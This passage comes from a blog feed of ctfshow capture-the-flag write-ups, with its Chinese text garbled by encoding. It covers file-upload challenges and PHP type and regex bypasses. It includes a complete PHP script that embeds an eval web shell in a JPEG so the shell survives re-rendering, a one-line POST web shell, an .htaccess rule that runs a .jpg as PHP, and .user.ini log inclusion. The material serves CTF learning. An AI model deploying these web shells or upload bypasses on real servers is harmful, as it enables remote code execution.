class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php echo 123;eval($_POST[0]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æ³•ï¼š  php exp.php a.jpg</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šç”Ÿæˆä¸€ä¸ªæ¸²æŸ“åçš„jpgæ–‡ä»¶ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225203021359.png" alt="image-20221225203021359"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225203058469.png" alt="image-20221225203058469"></p><p>è¿™æ˜¯é‡Œé¢çš„æœ¨é©¬ã€‚</p><p>ç„¶åè¿›è¡ŒæŠ“åŒ…rceå°±è¡Œäº†ã€‚</p><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225211902666.png" alt="image-20221225211902666"></p><p>è¿™é“é¢˜æ˜¯ä¸€é“zipç±»å‹ç±»å‹çš„é¢˜ç›®ï¼Œå°±æ˜¯ä¸Šä¼ æ–‡ä»¶åªèƒ½ä¸Šä¼ zipç±»å‹çš„ï¼Œç„¶åæˆ‘ä»¬å°±å»æœ¬åœ°æ‰¾ä¸€å¼ å›¾ç‰‡ï¼Œç„¶åå°±å»è½¬åŒ–ä¸ºzipç±»å‹å¹¶ä¸”ä¸Šä¼ ï¼Œå¹¶ä¸”åœ¨zipé‡Œå†™å…¥ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±è¿›è¡Œä¸Šä¼ ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225212120262.png" alt="image-20221225212120262"></p><p>ä¸Šä¼ æˆåŠŸåå°±æŠŠrequest è¯·æ±‚æ”¹æˆPOSTï¼Œåˆšå¼€å§‹æˆ‘å°±æ˜¯è¿™é‡Œæ²¡æ”¹ï¼Œæ‰¾äº†åŠå¤©é—®é¢˜ã€‚</p><p>ç„¶åå°±å¯ä»¥è¿›è¡Œrceäº†ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225212238112.png" alt="image-20221225212238112"></p><h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225230535662.png" alt="image-20221225230535662"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231006048.png" alt="image-20221225231006048"></p><p>é¢˜ç›®ç»™äº†è¿™ä¸ªä¸œè¥¿æ˜¯ä¸.htaccessæœ‰å…³çš„ï¼Œæ‰€ä»¥è¿™é“é¢˜æ˜¯å¾—ç”¨åˆ°.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;normal_up.jpg&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ–‡ä»¶åæ˜¯ï¼Œç­‰ä¼šè¦ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><p><strong>ç¬¬ä¸€æ­¥</strong></p><p>å…ˆä¸Šä¼ ä¸€ä¸ªjpgæ–‡ä»¶ï¼Œç„¶åæŠŠæ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹å…¨éƒ¨æ”¹æ‰ï¼Œæ–‡ä»¶åæ”¹æˆ.htaccessï¼Œæ–‡ä»¶å†…å®¹æ”¹æˆä¸Šé¢çš„ä»£ç ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231330037.png" alt="image-20221225231330037"></p><p><strong>ç¬¬äºŒæ­¥</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231346882.png" alt="image-20221225231346882"></p><p><strong>ç¬¬ä¸‰æ­¥</strong></p><p>è®¿é—®ä¸Šä¼ å›¾ç‰‡çš„åœ°å€ï¼Œç„¶åè¿›è¡Œrce</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231418066.png" alt="image-20221225231418066"></p><h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225233316993.png" alt="image-20221225233316993"></p><p>è¿™é“é¢˜çš„å‘æ˜¯åœ¨å®ƒç»™çš„ä¸Šä¼ ç›®å½•æ˜¯æ²¡æœ‰åŒ…å«uploadçš„ï¼Œå°±æ˜¯ç›´æ¥è®¿é—®å›¾ç‰‡åçš„è¯ï¼Œå°±æ˜¯ä¼šæŠ¥é”™ã€‚</p><p>çŸ¥é“è¿™é‡Œä»¥åå°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥å°±å…ˆä¸Šä¼ ä¸€ä¸ªpngå›¾ç‰‡ï¼Œç„¶åå°±ä¿®æ”¹å›¾ç‰‡å†…å®¹å’Œåç¼€å°±å¯ä»¥äº†ã€‚</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®/upload/å›¾ç‰‡å    å°±å¯è¿›è¡Œrceäº†</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225234159992.png" alt="image-20221225234159992"></p><h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225234946679.png" alt="image-20221225234946679"></p><p>è¿™é“é¢˜æŠŠ  &lt;   ç»™è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆphpè„šæœ¬çš„è¯ï¼Œå¿…é¡»å¾—åŒ…å«å®ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—æ¢å¦ä¸€ç§å½¢å¼äº†ï¼Œå°±æ˜¯åŒ…å«æ—¥å¿—ï¼Œé‚£ä¹ˆåŒ…å«æ—¥å¿—çš„è¯ï¼Œå¾—éœ€è¦ä¸€ä¸ªå‰æå°±æ˜¯å¾—æœ‰é»˜è®¤æ–‡ä»¶<strong>index.php</strong></p><p>ä½†æ˜¯è¿™é“é¢˜æ²¡æœ‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—è¿›è¡Œæ„é€ index.phpäº†</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153025708.png" alt="image-20221226153025708"></p><p>æˆåŠŸä¸Šä¼ index.php</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153057506.png" alt="image-20221226153057506"></p><p>ç„¶ååˆ©ç”¨.user.iniä¸Šä¼ æ—¥å¿—åŒ…å«</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153313062.png" alt="image-20221226153313062"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153332634.png" alt="image-20221226153332634"></p><p>å‘ç°æµ‹è¯•æˆåŠŸï¼Œç„¶åå°±å¯ä»¥è¿›è¡Œè¯»å–flagäº†ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153612103.png" alt="image-20221226153612103"></p><p>è¿™é‡Œå¾—è¿›è¡ŒæŠ“åŒ…è¯»å–ï¼Œæµè§ˆå™¨æŸ¥çœ‹çš„è¯ï¼Œçœ‹ä¸å‡ºæ¥ã€‚</p><h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>æºç </p><p><img src="\images\image-20221226153716031.png" alt="image-20221226153716031"></p><p>è¿™é¢˜å’Œä¸Šä¸€é¢˜çš„è§£æ³•ä¸€æ¨¡ä¸€æ ·ï¼Œå°±ä¸å¤šè¯´äº†ã€‚</p><p>â€‹        </p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow æ–‡ä»¶ä¸Šä¼  åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-PHPç‰¹æ€§ åˆ·é¢˜è®°å½•</title>
      <link href="/posts/94c13720.html"/>
      <url>/posts/94c13720.html</url>
      
        <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211029898.png" alt="image-20221218211029898"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211208944.png" alt="image-20221218211208944"></p><p>åˆ©ç”¨æ•°ç»„ç»•è¿‡ï¼Œå¯¹numçš„æ­£åˆ™åŒ¹é…ã€‚</p><p>å› ä¸º    â€”â€”&gt;<strong>preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„subjectæ˜¯æ•°ç»„æ—¶ä¼šè¿”å›false</strong></p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211321940.png" alt="image-20221218211321940"></p><p>å…ˆè§£é‡Šä¸€ä¸‹<code>intval</code>çš„æ„æ€</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211520421.png" alt="image-20221218211520421"></p><p>ç„¶åè¿™é“é¢˜å°±å¯ä»¥é€šè¿‡æ•°å­—åŠ å­—æ¯ç»•è¿‡ã€‚    <strong><!--ä¹Ÿå¯ä»¥ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡    ---->   num=0x117câ€”&gt;</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211550102.png" alt="image-20221218211550102"></p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218212029537.png" alt="image-20221218212029537"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218212822855.png" alt="image-20221218212822855"></p><p>è¿™é‡Œè§£é‡Šäº†<code>^php$/im</code>çš„æ„æ€     mæ˜¯å¤šè¡ŒåŒ¹é…çš„æ„æ€</p><p>^    â€”-&gt;æ˜¯æŒ‡ä»…åŒ¹é…/på¼€å¤´çš„å­—ç¬¦ä¸²</p><p>$    â€”-&gt;æ˜¯æŒ‡ä»…åŒ¹é…/pç»“å°¾çš„å­—ç¬¦ä¸²</p><p><a href="https://bbs.csdn.net/topics/320227966">https://bbs.csdn.net/topics/320227966</a></p><p>è¿™ç¯‡æ–‡ç« è®²è§£äº†phpæ­£åˆ™é‡åˆ°çš„æ‰€æœ‰ç¬¦å·çš„å«ä¹‰</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218213049399.png" alt="image-20221218213049399"></p><!--ä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·å†™æ‹¿åˆ°flagå‘¢ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªifæ˜¯å¤šè¡ŒåŒ¹é…ï¼Œç„¶åå°±ä¼šå½¢æˆå›è½¦  php,ç„¶åå°±ä¼šæ£€ç´¢ç¬¬ä¸€è¡Œï¼Œå‘ç°æ²¡æœ‰phpåä¼šæ¥ç€æ£€ç´¢ç¬¬äºŒè¡Œï¼Œä½†æ˜¯ç¬¬äºŒä¸ªifçš„è¯ï¼Œå°±æ˜¯å•è¡ŒåŒ¹é…ï¼Œåªä¼šåŒ¹é…åˆ°å›è½¦ç¬¦å·ï¼Œç„¶åå°±ç»“æŸäº†ï¼Œä¸ä¼šæ¥ç€åŒ¹é…ä¸‹ä¸€è¡Œçš„php--><p> <code>%0aphp</code>æ˜¯è¿™æ ·çš„</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218213434661.png" alt="image-20221218213434661"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214708879.png" alt="image-20221218214708879"></p><p>ç”¨4476çš„16è¿›åˆ¶æˆ–è€…8è¿›åˆ¶éƒ½èƒ½ç»•è¿‡</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214745883.png" alt="image-20221218214745883"></p><p><strong>è§£æ³•2ï¼š</strong></p><p><code>intval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å– ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡å‰é¢çš„==4476æˆ‘ä»¬å°±å¯ä»¥æ„é€  4476e123 å…¶å®ä¸éœ€è¦æ˜¯eå…¶ä»–çš„å­—æ¯ä¹Ÿå¯ä»¥</code></p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>æºç </p><p><img 